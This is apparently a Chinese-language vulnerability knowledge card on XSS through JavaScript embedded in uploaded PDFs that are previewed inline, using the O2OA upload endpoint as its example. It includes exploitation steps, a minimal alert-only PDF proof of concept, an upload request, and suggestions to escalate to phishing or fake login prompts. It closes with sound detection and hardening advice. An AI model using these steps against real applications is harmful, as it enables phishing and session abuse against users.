---
id: web-generic-xss-pdf-javascript-inline-preview
title: PDF 内嵌 JavaScript 配合上传后内联预览触发 XSS
type: scenario
domain: web
path: web/generic/xss
technique: pdf-javascript-inline-preview-xss
aliases:
- PDF XSS
- PDF JavaScript XSS
- 上传 PDF 预览 XSS
- Content-Disposition inline 预览
- app.alert PDF
- 文件上传二次利用
tags:
- xss
- pdf
- file-upload
- javascript
- content-disposition
- inline-preview
- o2oa
- web
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V18
  verified_at: '2026-11-05T01:57:11+08:00'
  notes: 已对照原文核对：网盘上传 POST /x_file_assemble_control/jaxrs/attachment/upload/folder/(0) 的 multipart 包、/Names /JavaScript PDF 结构、/attachment/<id>/download 内联预览弹出 xss（img 05）均与卡片一致；PDF JS 在 Chrome 内嵌查看器执行受浏览器/阅读器差异影响，卡片已标 medium confidence 并说明边界
---

## 一句话结论

当文件上传功能允许上传 PDF，且服务端用 `Content-Disposition: inline`（或直接不设置该头）以内嵌方式返回文件时，PDF 内的 JavaScript 动作（`/OpenAction`、`/Names /JavaScript`）会在受害者打开预览时由 PDF 渲染器执行；用 `app.alert('xss')` 即可证明任意 JS 执行，进一步可做钓鱼、伪造登录框、读取渲染器可访问的上下文，或结合 PDF 解析漏洞。核心条件是“可上传 + 可内联预览 + 渲染器执行 PDF JS”三者同时成立。

## 原理

- PDF 规范支持文档级 JavaScript：Catalog 可通过 `/OpenAction` 指向一个 `/S /JavaScript` 动作，或通过 `/Names << /JavaScript << /Names [...] >> >>` 注册命名脚本；打开文档时渲染器会执行。
- PDF JavaScript API 提供 `app.alert()`、`app.launchURL()`、表单操作等能力。最小 PoC 只需在打开动作里调用 `app.alert('xss')`，即可证明代码在渲染器内执行。
- 浏览器/阅读器的行为决定影响边界：
  - 若站点用 `<iframe>`/内嵌查看器把 PDF 嵌入自身页面，且查看器与站点同源或允许脚本访问父页面，PDF JS 可触及站点上下文；
  - Chrome/Firefox 内置 PDF 查看器通常把文档放在扩展/沙箱源中执行，PDF JS 能力受限，但仍可弹窗、发起网络请求或诱导用户；
  - Adobe Acrobat/Reader 及部分第三方嵌入组件对 PDF JS 支持更完整，风险更高。
- 服务端常见缺陷是“预览即下载”：对用户上传文件直接返回原 `Content-Type`，没有强制 `Content-Disposition: attachment`，也没有 `X-Content-Type-Options: nosniff` 或独立沙箱域。这样用户点击“预览”就把主动内容加载进了浏览器。
- 该问题与“不限制上传类型/不校验文件内容”叠加：即使扩展名/MIME 检查允许 PDF，PDF 本身仍是可携带脚本的主动内容，不能当作纯静态文档。

## 触发条件

- 应用存在文件上传功能，允许上传 PDF（网盘、附件、公告、通知、工单等）。
- 服务端返回文件时使用 inline 展示/预览，或前端用 iframe/`<embed>`/`<object>` 加载文件 URL，且未强制下载。
- 受害者的 PDF 渲染器会执行 PDF JavaScript（原文本地浏览器预览实测会执行 `app.alert`；不同浏览器/阅读器版本行为不同）。
- 攻击者能登录并上传文件，或上传接口未授权；受害者会点击预览链接。
- 若目标是同源嵌入查看器，还需查看器未做源隔离/CSP sandbox。

## 利用步骤

1. 找到允许上传 PDF 的接口，记录上传后的文件 ID/下载 URL。原文使用网盘附件上传：
   ```http
   POST /x_file_assemble_control/jaxrs/attachment/upload/folder/(0)
   Content-Type: multipart/form-data
   ```
2. 构造带 JavaScript 的 PDF：Catalog 加 `/OpenAction` 指向 JavaScript 动作，脚本调用 `app.alert('xss')`。
3. 上传 PDF，拿到返回的附件 ID；访问下载/预览 URL（原文形如 `/x_file_assemble_control/jaxrs/attachment/<id>/download`）。
4. 观察响应头：若无 `Content-Disposition: attachment` 且 `Content-Type: application/pdf`，浏览器会内嵌打开；确认是否弹出 `xss`。
5. 将 `app.alert` 替换为实际利用脚本：伪造登录框、`app.launchURL` 跳转钓鱼、提交表单、尝试读取可访问的父页面/DOM（取决于查看器隔离）。
6. 若浏览器查看器不执行 JS，改用 Adobe Reader/嵌入组件场景，或寻找其他可内联渲染的主动文件类型（SVG、HTML）作为替代。

## PoC

最小 PDF（`/OpenAction` 形式）：

```text
%PDF-1.3
1 0 obj
<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>
endobj
2 0 obj
<< /Type /Pages /Count 0 /Kids [] >>
endobj
3 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert\('xss'\);) >>
endobj
trailer
<< /Root 1 0 R >>
%%EOF
```

原文使用的 `/Names /JavaScript` 命名树形式（效果相同，部分查看器更兼容）：

```text
3 0 obj
<< /Type /Catalog /Pages 1 0 R
   /Names << /JavaScript << /Names [ (js1) 4 0 R ] >> >>
>>
endobj
4 0 obj
<< /Type /Action /S /JavaScript /JS (app.alert\('xss'\);) >>
endobj
```

上传请求示例：

```http
POST /x_file_assemble_control/jaxrs/attachment/upload/folder/(0) HTTP/1.1
Content-Type: multipart/form-data; boundary=----Boundary

------Boundary
Content-Disposition: form-data; name="file"; filename="xss.pdf"
Content-Type: application/pdf

<PDF 字节>
------Boundary
Content-Disposition: form-data; name="fileName"

xss.pdf
------Boundary--
```

随后打开返回的 `.../attachment/<id>/download`，若页面内嵌渲染则执行 `app.alert('xss')`。原文本地环境截图显示弹出“localhost 上的嵌入页面显示 xss”。

## 变体与关联

- **上传点变体**：公告/通知附件、网盘、工单附件、头像/文档导入、邮件附件等，只要提供在线预览就可能复现。
- **响应头变体**：`Content-Disposition: inline; filename=...`、完全不设置该头、或前端用 `iframe src=下载URL` 加载；三者都可导致内联渲染。
- **文件类型变体**：SVG（可含 `<script>`）、HTML、XML（XSLT）、SWF 等主动内容在 inline 场景下同样可执行脚本；PDF 只是其中一种。
- **PDF 动作变体**：`/OpenAction`、`/AA`（附加动作）、`/Names /JavaScript`、表单字段的 `/A` 动作、`/Launch` 启动程序、`/SubmitForm` 外发数据。
- **与“上传预览”卡的关系**：本卡聚焦 PDF JS 执行；上传绕过、解析漏洞与竞争条件见文件上传路径的卡片。
- **同源批量问题**：该应用的通知公告与网盘两处上传均存在同类问题，属于“上传/预览未加固”的聚集缺陷；与 `web-generic-xss-o2oa-rest-designer-mass-stored-xss` 同属一个应用的 XSS 面。

## 检测与防御

- 对所有用户上传文件强制 `Content-Disposition: attachment`，禁止浏览器内联渲染；预览需求改为服务端转码/缩略图或独立沙箱域。
- 上传文件存放在与主站不同的域名（sandbox domain），并设置 `X-Content-Type-Options: nosniff`、严格 CSP、`Content-Security-Policy: sandbox`。
- 服务端校验文件真实类型与内容：拒绝或剥离 PDF 中的 `/JavaScript`、`/OpenAction`、`/AA`、`/Launch`、`/SubmitForm` 等主动内容；对 SVG/HTML 只允许安全子集。
- 客户端：禁用 PDF 查看器的 JavaScript（Acrobat/Reader 策略、浏览器企业策略），保持阅读器与浏览器补丁最新。
- 代码审计：搜索文件下载/预览接口的响应头设置，确认是否统一强制 attachment；检查上传类型白名单是否包含 PDF/SVG/HTML 等主动内容。
- 运行时检测：上传 PDF 中出现 `/JavaScript`、`/OpenAction`、`app.alert`、`app.launchURL` 等特征；对 inline 返回用户上传文件的响应做告警。
